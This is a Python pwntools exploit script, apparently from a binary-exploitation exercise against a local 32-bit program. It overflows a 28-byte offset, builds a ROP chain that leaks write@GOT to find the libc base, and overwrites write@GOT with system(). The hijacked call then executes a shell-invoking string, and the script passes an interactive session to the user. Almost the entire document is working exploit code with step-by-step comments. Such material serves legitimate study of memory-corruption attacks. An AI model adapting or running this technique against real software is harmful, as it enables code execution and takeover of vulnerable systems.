#!/usr/bin/python 

from pwn import *

#binary = "./1_vulnerable"
binary = "./mod"
p = process(binary) # Starts the process

offset___libc_start_main_ret = 0x18637
offset_system = 0x0003ada0
offset_read = 0x000d5b00
offset_write = 0x000d5b70

# 0x0804845f <+36>:    call   0x8048320 <write@plt>
# 0x0804844c <+17>:    call   0x8048300 <read@plt>
write_PLT = 0x8048320 
read_PLT = 0x8048300 
new_system_PLT = write_PLT
new_setuid_PLT = write_PLT

# 0804a014  00000407 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
# 0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
write_GOT = 0x0804a014
read_GOT = 0x0804a00c

# Using gadget from binary is possible, it doesnt only have to be from libc
# Thing is since this isn't a PIE, address of pop, pop, pop, ret is hardcoded
# 0x080484f9 : pop esi ; pop edi ; pop ebp ; ret
pppr = 0x080484f9
pr = pppr + 2

# 1_vulnerable : 0x8048243 --> 0x72006465 ('ed')
str_ed = 0x8048243

# stdin = 0
# stdout = 1
# stderr = 2
stdin = 0
stdout = 1

def main():
	# 1094402369 found at offset: 28
	offset = 28 
	buf = 'A' * 28 

	# Crafting Payload
	# Leak address of write@GOTS using write() which is writing to STDOUT using write_GOT as an input
	# write(int fd, const void *buf, size_t count)
	buf += p32(write_PLT) # Function: Calls the write function	
	buf += p32(pppr) # Return: Calling function has 3 arguments, so we need to pop stack 3 times to go to the next function
	buf += p32(stdout) # Arg 1: Write to STDOUT(console)
	buf += p32(write_GOT) # Arg 2: Address contained inside of write@GOTS is to be written to the console
	buf += p32(4) # Arg 3: 32-Bits address is 4 Bytes in length 

	# Overwriting address of write@GOTS using read() which is reading from STDIN using system_addr[1] as an input later
	# read(int fildes, void *buf, size_t nbyte);
	buf += p32(read_PLT) # Function: Calls the read function
	buf += p32(pppr) # Return: Calling function has 3 arguments, so we need to pop stack 3 times to go to the next function
	buf += p32(stdin) # Arg 1: Write to STDIN(write@GOT)
	buf += p32(write_GOT) # Arg 2: Address to be written to
	buf += p32(4) # Arg 3: Writing only 4 Bytes

	buf += p32(new_system_PLT)
	buf += p32(0xdeadbeef)
	buf += p32(str_ed)

	log.info("Payload: %s Bytes" % str(len(buf)) )

	# Sends payload to program
	p.send(buf)
	
	# Clear the 16 Bytes written because buffer size is 16 Bytes
	p.recv(16)

	leak = p.recv(4) # 4 Bytes which is the Address of the leak
	write_addr = u32(leak) # Converts it to integer

	log.info("Leaking:")	
	log.success("write addr: 0x%x" %write_addr)
	
	# Determine libc_base_addr 
	libc_base_addr = write_addr - offset_write
	log.success("libc base addr: 0x%x" %libc_base_addr)	

	# Calculate system_addr
	system_addr = libc_base_addr + offset_system
	log.success("system addr: 0x%x" %system_addr)

	# Pass to debugger
	# raw_input(str(p.proc.pid))

	# Stage 2
	p.send(p32(system_addr))
	log.warn("Overwriting write@GOTS with 0x%x" %system_addr)

	# Pass interaction back to user
	p.interactive()

if __name__ == "__main__":
	main()
